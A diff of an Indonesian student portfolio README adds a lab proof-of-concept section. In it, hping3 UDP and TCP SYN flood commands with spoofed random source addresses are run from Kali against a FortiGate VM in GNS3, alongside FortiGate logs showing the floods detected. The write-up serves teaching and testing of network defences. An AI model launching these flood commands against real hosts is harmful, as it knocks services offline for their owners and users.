@@ -15,6 +15,7 @@ Semua proyek di bawah ini dibangun sebagai **Proof of Concept (PoC)** dengan fok
 ## 1. Enterprise Game Server Architecture
 [![GNS3](https://img.shields.io/badge/Simulated_with-GNS3-blue?style=flat-square&logo=gns3)](https://www.gns3.com/)
 [![Status](https://img.shields.io/badge/Project-Proof_of_Concept-orange?style=flat-square)]()
+[![DDoS Tested](https://shields.io)](https://kali.org)
 
 Proyek ini merupakan **Proof of Concept (PoC)** rancangan infrastruktur jaringan untuk perusahaan game online berskala internasional. Dirancang sebagai tugas mata kuliah Jaringan Komputer, proyek ini berfokus pada optimalisasi pengiriman konten game global serta penguatan keamanan siber terhadap ancaman digital.
 
@@ -68,6 +69,70 @@ Karena keterbatasan spesifikasi perangkat keras (*hardware*) pada *host* lokal y
 Proyek ini dikerjakan secara kolaboratif oleh:
 * [Fawwaz Yaqzhan](https://github.com/230055Fawwaz)
 * [Stan Fredheric](https://github.com/craten54)
+
+---
+
+## 🛡️ Proof of Concept: DDoS Attack Simulation
+
+Pengujian dilakukan menggunakan **Kali Linux (Net-Toolbox Docker Container)** sebagai aktor penyerang, dan **FortiGate-VM64-KVM** sebagai target sekaligus perangkat keamanan jaringan yang memitigasi serangan.
+
+---
+
+### 1. UDP Flood Attack
+Serangan ini bertujuan untuk membanjiri port target dengan paket UDP dalam volume besar tanpa memeriksa status koneksi, memaksa perangkat target menghabiskan sumber daya untuk memproses paket sampah.
+
+#### 💻 Kali Linux Command & Output
+```bash
+┌──(root㉿Kali-1)-[/]
+└─# hping3 --udp -p 80 --flood --rand-source 10.0.0.2
+HPING 10.0.0.2 (eth0 10.0.0.2): udp mode set, 28 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 10.0.0.2 hping statistic ---
+6,863,095 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+```
+
+#### 🛡️ FortiGate Detection Log
+```text
+FortiGate-VM64-KVM # diagnose ips anomaly list
+list nids meter:
+id=udp_flood          ip=10.0.0.2 dos_id=1 exp=1000 pps=35484 freq=94886
+
+total # of nids meters: 1.
+```
+
+* **Analisis Ringkas:** Sistem pertahanan FortiGate mendeteksi anomali dengan ID `udp_flood` pada IP tujuan `10.0.0.2` dengan kecepatan trafik serangan mencapai **35.484 packets per second (pps)**.
+
+---
+
+### 2. TCP SYN Flood Attack
+Serangan ini menyalahgunakan proses jabat tangan (*three-way handshake*) TCP dengan mengirimkan paket SYN secara terus-menerus menggunakan IP palsu (`--rand-source`), sehingga target kehabisan kapasitas antrean koneksi (*backlog queue*).
+
+#### 💻 Kali Linux Command & Output
+```bash
+┌──(root㉿Kali-1)-[/]
+└─# hping3 -S -p 80 --flood --rand-source 10.0.0.2
+HPING 10.0.0.2 (eth1 10.0.0.2): S set, 40 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 10.0.0.2 hping statistic ---
+3,832,424 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+```
+
+#### 🛡️ FortiGate Detection Log
+```text
+FortiGate-VM64-KVM # diagnose ips anomaly list
+list nids meter:
+id=tcp_syn_flood      ip=10.0.0.2 dos_id=1 exp=1000 pps=16385 freq=99639
+
+total # of nids meters: 1.
+```
+
+* **Analisis Ringkas:** FortiGate berhasil mengidentifikasi serangan spesifik `tcp_syn_flood` yang mengarah ke IP `10.0.0.2` dengan intensitas serangan sebesar **16.385 packets per second (pps)**.
+
+---
 
 ### Topologi Jaringan
 ![Topologi GNS3](perusahaan-game-gns3/Topologi-Jaringan.png)
@@ -131,6 +196,8 @@ Proyek ini dikerjakan secara kolaboratif oleh:
 * [Fawwaz Yaqzhan](https://github.com/230055Fawwaz)
 * [Daniel Bintang](https://github.com/username_daniel)
 * [Jeremi Nicolas](https://github.com/username_jeremi)
+
+---
 
 ### Topologi Jaringan
 ![Topologi Packet Tracer](ritel-pintar-packet-tracer/Topologi-Jaringan.png)
